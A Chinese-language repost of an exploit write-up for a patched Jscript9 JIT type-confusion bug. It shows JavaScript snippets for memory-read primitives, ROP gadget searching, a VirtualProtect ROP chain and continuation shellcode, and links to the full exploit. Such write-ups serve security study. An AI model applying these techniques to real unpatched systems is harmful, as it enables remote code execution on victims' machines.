#  Pwn2Own 2021 Jscript9 远程代码执行漏洞   
 Ots安全   2024-03-24 12:33  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
这是我前段时间为 Jscript9.dll 中的 JavaScript JIT 类型混淆漏洞编写的漏洞利用的简短文章。  
  
  
我展示了一种利用 JavaScript 引擎中类型混淆漏洞的经典技术。该漏洞利用完全动态的 ASLR 旁路，以及避免崩溃的最先进的进程延续。不使用堆喷射，该漏洞通过精确控制程序状态和 shellcode 的原子放置来发挥作用。影响是任意远程代码执行。该漏洞并未武器化，并且出于教育目的而发布。  
  
  
**文件**  
  
exploit.html：漏洞利用的发布版本。demo.mp4：视频演示。debug/：带有调试助手和注释的代码的特殊版本。  
  
  
**错误**  
  
该错误已于 2017 年修复，这是由于 JIT 优化而导致 Microsoft Jscript9 JavaScript 引擎代码中的类型混淆，其中对象可能被错误地视为内存地址或相反。  
  
  
**利用架构**  
  
我在我的漏洞利用代码中遵循系统工程流程。我首先在适当的内存损坏漏洞之上定义基本原语，例如 write() 和 read() 任意内存。之后，我定义下一个顺序（但仍然是低级）原语，例如 getObjectAt() 和 getAddrOf()。之后，我定义了高级漏洞利用原语，例如 getStack() 和bypassASLR()。完成所有这些后，利用主函数就只有三行代码。  
  
  
带有调试注释的高级漏洞 API 示例：  
```
function getStack() {

let type = read32( getAddrOf([{}]) + 4)
log("Type: 0x" + type.toString(16))
let javascriptLibrary = read32(type + 4)
log("JavascriptLibrary: 0x" + javascriptLibrary.toString(16))
let scriptContext = read32(javascriptLibrary + 0x21c)
log("ScriptContext: 0x" + scriptContext.toString(16))
let threadContext = read32(scriptContext + 0x250) // find this and above offsets in eg. js::GlobalObject::EntryParseInt
log("ThreadContext: 0x" + threadContext.toString(16)) // (anyone who calls ThreadContext::IsStackAvailable)
let stackLimit = read32(threadContext + 0x18) // find offset in ThreadContext::IsStackAvailable
log("StackLimitForCurrentThread: 0x" + stackLimit.toString(16))
let stackBottom = stackLimit - 0xc000 + 2*1024*1024 - 4
log("Stack bottom: 0x" + stackBottom.toString(16))

return stackBottom

}
```  
  
您在 main 函数中提供的 shellcode 是直接模板化的：所有必要的 CoE 和 VirtualProtect 子 shellcode 都在原语中定义。  
  
  
由于系统化的设计，该漏洞被证明很容易维护（而我最初依赖于固定的二进制偏移量并且没有动态 ASLR 旁路），并且在目标软件的几十个版本中 100% 稳定。  
  
  
**动态设计**  
  
在漏洞利用代码的最终版本中，我动态地定位 ROP 小工具以消除对固定二进制偏移量的依赖。这使得该漏洞在我测试期间（目标软件更新大约一年）内 100% 不会过时。  
  
  
我使用名为 findSignature 的特殊函数扩展 Uint8Array 数组原型  
```
Uint8Array.prototype.findSignature = function( signature ) {

function check( element, index, ary ) {
if ( element != signature[0] ) return false;          
for ( var i = 0; i < signature.length; i++ ) {
if ( signature[i] == undefined ) continue;
if ( ary[index+i] != signature[i] ) return false;
      }
return true;
   }

return this.findIndex(check)

}
```  
  
然后你会发现 ROP 小工具如下：  
```
jscript9.ret = jscript9.findSignature([0x89, 0x45, 0xec, 0x85, 0xc0, 0x78, 0x1c, 0x8b, 0x45, 0x08, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x4e, 0x10])
if ( jscript9.ret == -1 ) return undefined

jscript9.gadget1 = jscript9.findSignature([0x5f, 0x5e, 0xc3])
if ( jscript9.gadget1 == -1 ) return undefined

jscript9.gadget2 = jscript9.findSignature([0xff, 0x75, 0x14, 0x57, 0x56, 0xff, 0x15, ,,,, 0x5f, 0x5e, 0x5b, 0x8b, 0xe5, 0x5d, 0xc2, 0x18])
if ( jscript9.gadget2 == -1 ) return undefined
```  
  
工作起来就像一个魅力（我实际上几年前在推特上发布了这项技术），不，我不建议在使用脚本编程语言进行编码时省略分号。  
  
  
**多阶段Shellcode**  
  
我的漏洞利用设计抽象出了几个与功能负载无关的低级 shellcode 阶段。奇怪的程序状态控制从堆栈上的一些 ROP 小工具开始。您的 shellcode（功能有效负载）处于第 2 阶段（您将其传递给漏洞利用函数）。第 1 阶段 shellcode 处理对 VirtualProtect() 的调用，为功能 shellcode 提供一些可写内存。第 3 阶段 shellcode 处理进程延续。这是带有调试注释的示例：  
```
let stage1 = new Uint32Array([
// = original esp
   jscript9.base + jscript9.gadget1,  // pop edi; pop esi; retn
3, 2, 1, 0,  // ScriptSite::Execute said retn 10h
// arguments...
0x1000, // size
   stage2_3.addr,  // lpAddress
   jscript9.base + jscript9.gadget2, // push args; call VirtualProtect()
// pushed arguments frame in VirtualProtect:
// stage2_3,
// 0x1000,
// 0x40,
   stage2_3.addr + stage2_3.length - 4, // dwOldProtect pointer
// = esp on returned from VirtualProtect (ret 10h)
1, 2, 3, 4, 5, 6, // mov esp, ebp in ::ProtectPages will eat this
0, 1, 0, 1, 0, 1,
0, 1, 0, 1, 0, 1,
0, 1, 0, 1, 0, 1,
// = original ebp
1, // pop ebp
   stage2_3.addr, // return to shellcode (ret 18h in ::ProtectPages)
// ...CoE filler (ret 18h)
0, 0, 0,
0x40, // ebp+14h PAGE_EXECUTE_READWRITE
0, 0
]);
stage1.addr = read32( getAddrOf(stage1) + 8*4 )
dump("stage1", stage1)
```  
  
**流程延续**  
  
进程延续代码并不简单。我对目标软件二进制文件进行了逆向工程，以找出如何修复被漏洞利用破坏的寄存器和堆栈。CoE shellcode 是从头开始制作的。  
```
let stage3 = new Uint8Array([
0x31, 0xc0,  // xor eax, eax
0xb9, 0, 0, 0, 0, // mov ecx, coe4.length
0xbe, 0, 0, 0, 0, // mov esi, coe4.buffer
0xbf, 0, 0, 0, 0, // mov edi, retPtr
0x8b, 0xe7, // mov esp, edi
0xf3, 0xa5, // rep movsd
0x8b, 0xec, // mov ebp, esp
0x81, 0xc5, 0x84, 0, 0, 0, // add ebp, 84h
0xbe, 0, 0, 0, 0, // mov esi, *(retPtr + f0h)
0xc2, 0x10, 0, // ret 10h
0x9f, 0x9f, 0x9f, 0x9f // placeholder
   ]);
   stage3.addr = read32( getAddrOf(stage3) + 8*4 );
dump("stage3", stage3)

let stage2_3 = new Uint8Array(stage2.length + stage3.length)
   stage2_3.addr = read32( getAddrOf(stage2_3) + 8*4 );
dump("stage2_3", stage2_3)
   log("Shellcode + CoE: 0x" + stage2_3.addr.toString(16))

   ... arbitrary payload placement ... 

// fixup continuation:

   write32(retPtr + 4*4, 0x48 + coe4.addr)
   write32(stage3.addr + 3, stage1.length)
   write32(stage3.addr + 8, coe4.addr)
   write32(stage3.addr + 13, retPtr)
   write32(stage3.addr + 30, read32( retPtr + 0xf0 ));

   stage2_3.set(stage2, 0)
   stage2_3.set(stage3, stage2.length)

dump("final shellcode", stage2_3)

// ready
```  
  
我的 CoE 代码的一个已知限制是它依赖于编译器的静态寄存器分配，我凭经验验证了这一点适用于目标软件，但理论上不能保证适用于目标二进制文件的所有未来版本。  
  
  
**调试**  
  
为了方便学习，我在 debug/ 目录中包含了四个调试版本的代码。每个版本的调试代码都是高级漏洞利用工程的一个特定阶段的快照。  
  
  
我们从一个简单的测试用例开始，它通过概念证明清楚地显示了该漏洞：a）具有任意内存读取的CPU寄存器控制，这会导致访问冲突（test-crash.html）和b）泄漏一些堆内存（test-泄漏.html）。注意：我跳过 RCE PoC，因为众所周知 bug 类提供了这种功能。接下来，我们开始编写漏洞利用程序，首先旨在执行基本的任意代码，然后解决进程延续问题，最后删除漏洞利用程序中对固定二进制偏移量的所有依赖，使其面向未来。  
  
  
版本目标：0.1：RCE 0.2 和 0.3：流程延续 0.4：动态 ASLR 绕过。  
  
  
**代码**  
  
https://zerodayengineering.com/code/jscript9-exploit.zip  
  
https://github.com/badd1e/Pwn/tree/main/jscript9-RCE  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
